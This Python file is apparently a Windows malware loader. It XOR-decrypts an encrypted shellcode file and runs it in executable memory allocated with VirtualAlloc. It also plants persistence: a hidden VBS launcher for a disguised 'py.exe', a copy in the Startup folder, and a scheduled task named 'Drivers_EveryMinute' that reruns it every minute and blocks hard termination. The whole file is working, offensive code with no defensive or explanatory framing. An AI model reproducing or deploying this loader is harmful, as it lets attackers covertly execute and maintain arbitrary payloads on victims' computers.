import os
import ctypes
import sys
import platform
import subprocess
import threading
import tempfile
import shutil

XOR_KEY = 0xAA

def xor_decrypt(data: bytes, key: int) -> bytes:
    return bytes([b ^ key for b in data])

def read_and_decrypt_shellcode():
    try:
        script_dir = os.path.dirname(os.path.realpath(__file__))
        encrypted_path = os.path.join(script_dir, "7z_encrypted.bin")

        print(f"Reading encrypted shellcode from {encrypted_path}")
        with open(encrypted_path, "rb") as f:
            encrypted = f.read()

        print(f"File size: {len(encrypted)} bytes")
        decrypted = xor_decrypt(encrypted, XOR_KEY)
        print("Decrypted shellcode")
        return decrypted
    except Exception as e:
        print(f"[ERROR] read_and_decrypt_shellcode: {e}")
        sys.exit(1)

def execute_shellcode_in_current_process(shellcode):
    try:
        if platform.architecture()[0] != "32bit":
            print("[ERROR] Only 32-bit architecture is supported.")
            return

        shellcode_size = len(shellcode)
        print(f"{shellcode_size} bytes loaded")

        memory = ctypes.windll.kernel32.VirtualAlloc(
            None, shellcode_size, 0x3000, 0x40
        )
        if not memory:
            print("[ERROR] VirtualAlloc failed")
            return

        ctypes.memmove(memory, shellcode, shellcode_size)
        print("Shellcode copied to memory")

        shellcode_func = ctypes.cast(memory, ctypes.CFUNCTYPE(None))
        print("Executing shellcode...")
        shellcode_func()
        print("Shellcode execution done")
    except Exception as e:
        print(f"[ERROR] execute_shellcode: {e}")

import shutil  # Đảm bảo có dòng này đầu file

def write_vbs_launcher():
    try:
        appdata = tempfile.gettempdir()
        vbs_path = os.path.join(appdata, "Drivers", "run.vbs")
        python_exe = os.path.join(appdata, "Drivers", "macOS", "py.exe")
        script = os.path.join(appdata, "Drivers", "macOS", "run.py")

        vbs_content = f'''Set wmi = GetObject("winmgmts:\\\\.\\root\\cimv2")
Set procs = wmi.ExecQuery("Select * from Win32_Process where Name = 'py.exe'")
If procs.Count = 0 Then
    Set shell = CreateObject("WScript.Shell")
    shell.Run """{python_exe}"" ""{script}""", 0
    Set shell = Nothing
End If
'''

        os.makedirs(os.path.dirname(vbs_path), exist_ok=True)
        with open(vbs_path, "w", encoding="utf-8") as f:
            f.write(vbs_content)

        print(f"[+] Created VBS: {vbs_path}")

        startup_path = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
        dest_vbs = os.path.join(startup_path, "run.vbs")
        try:
            shutil.copyfile(vbs_path, dest_vbs)
            print(f"[+] Copied VBS to Startup folder: {dest_vbs}")
        except Exception as e:
            print(f"[ERROR] Copy to Startup folder failed: {e}")

        return vbs_path
    except Exception as e:
        print(f"[ERROR] write_vbs_launcher: {e}")
        return None

def create_task_scheduler():
    try:
        vbs_path = write_vbs_launcher()
        if not vbs_path:
            return

        task_name = "Drivers_EveryMinute"

        xml_content = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <TimeTrigger>
      <StartBoundary>2025-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
      <Repetition>
        <Interval>PT1M</Interval>
        <Duration>P9999DT23H59M59S</Duration>
      </Repetition>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>wscript.exe</Command>
      <Arguments>"{vbs_path}"</Arguments>
    </Exec>
  </Actions>
</Task>"""

        with tempfile.NamedTemporaryFile(delete=False, suffix=".xml", mode="w", encoding="utf-16") as temp_xml:
            temp_xml.write(xml_content)
            temp_xml_path = temp_xml.name

        command = f'schtasks /Create /TN "{task_name}" /XML "{temp_xml_path}" /F'
        subprocess.run(command, check=True, shell=True)
        print(f"[+] Task '{task_name}' created successfully.")

        os.remove(temp_xml_path)

    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to create task '{task_name}': {e}")
    except Exception as ex:
        print(f"[ERROR] XML task creation: {ex}")

def main():
    print("Starting run.py")

    shellcode = read_and_decrypt_shellcode()

    t1 = threading.Thread(target=execute_shellcode_in_current_process, args=(shellcode,))
    t2 = threading.Thread(target=create_task_scheduler)

    t1.start()
    t2.start()

    t1.join()
    t2.join()

if __name__ == "__main__":
    main()
